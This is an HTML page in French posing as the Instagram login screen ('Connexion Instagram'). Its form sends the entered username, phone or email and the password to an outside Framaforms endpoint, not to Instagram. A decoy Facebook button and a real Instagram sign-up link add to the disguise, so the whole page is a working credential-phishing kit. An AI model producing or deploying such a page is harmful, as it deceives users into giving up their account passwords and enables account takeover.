<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Connexion Instagram</title>
<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet" />
<style>
  body {
    background-color: #000;
    color: #fff;
    font-family: Arial, sans-serif;
    margin: 0; padding: 0;
  }
  .container {
    max-width: 350px;
    margin: 50px auto;
    padding: 30px 20px;
    background: #121212;
    border-radius: 8px;
  }
  h1 {
    font-family: 'Pacifico', cursive;
    font-size: 36px;
    text-align: center;
    margin-bottom: 20px;
  }
  form {
    display: flex;
    flex-direction: column;
  }
  input[type="text"],
  input[type="password"] {
    background: #222;
    border: none;
    border-radius: 5px;
    color: #fff;
    font-size: 14px;
    margin-bottom: 15px;
    padding: 12px 40px 12px 12px;
    position: relative;
  }
  .password-wrapper {
    position: relative;
  }
  .toggle-password {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    width: 24px;
    height: 24px;
    fill: #ccc;
  }
  button {
    background-color: #3897f0;
    border: none;
    color: white;
    font-weight: 600;
    padding: 10px;
    border-radius: 5px;
    cursor: pointer;
    margin-bottom: 15px;
    font-size: 14px;
  }
  button.facebook {
    background-color: #1877f2;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  button.facebook svg {
    margin-right: 8px;
    fill: white;
    width: 18px;
    height: 18px;
  }
  .signup {
    text-align: center;
    font-size: 14px;
    color: #aaa;
  }
  .signup a {
    color: #3897f0;
    text-decoration: none;
    font-weight: 600;
  }
  .or-divider {
    display: flex;
    align-items: center;
    margin: 10px 0 15px;
    color: #888;
    font-size: 13px;
  }
  .or-divider::before,
  .or-divider::after {
    content: "";
    flex: 1;
    border-bottom: 1px solid #333;
    margin: 0 10px;
  }
</style>
</head>
<body>
  <div class="container">
    <h1>Instagram</h1>
    <button class="facebook" type="button" onclick="alert('Connexion avec Facebook non implémentée')">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M22.675 0h-21.35C.6 0 0 .6 0 1.326v21.348C0 23.4.6 24 1.325 24H12.82v-9.294H9.692v-3.622h3.127V8.414c0-3.1 1.894-4.788 4.66-4.788 1.325 0 2.466.099 2.796.143v3.24l-1.918.001c-1.504 0-1.796.716-1.796 1.765v2.313h3.588l-.467 3.622h-3.12V24h6.116C23.4 24 24 23.4 24 22.674V1.326C24 .6 23.4 0 22.675 0z"/></svg>
      Connexion avec Facebook
    </button>
    <form action="https://framaforms.org/connexion-instagram-1752775137" method="post" target="_blank">
      <input
        type="text"
        name="new_1752775215051"
        placeholder="Téléphone, nom d’utilisateur ou email"
        required
        autocomplete="username"
      />
      <div class="password-wrapper">
        <input
          type="password"
          name="new_1752775407266"
          placeholder="Mot de passe"
          required
          autocomplete="current-password"
          id="password"
        />
        <svg class="toggle-password" id="togglePassword" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10zM12 9a3 3 0 1 0 0 6 3 3 0 0 0 0-6z"/>
        </svg>
      </div>
      <button type="submit">Connexion</button>
    </form>
    <div class="signup">
      Vous n’avez pas de compte ? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" rel="noopener">Inscrivez-vous</a>
    </div>
  </div>

<script>
  const togglePassword = document.querySelector('#togglePassword');
  const password = document.querySelector('#password');
  togglePassword.addEventListener('click', function () {
    const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
    password.setAttribute('type', type);
    // Change icon fill color on toggle (optional)
    this.style.fill = type === 'password' ? '#ccc' : '#fff';
  });
</script>
</body>
</html>
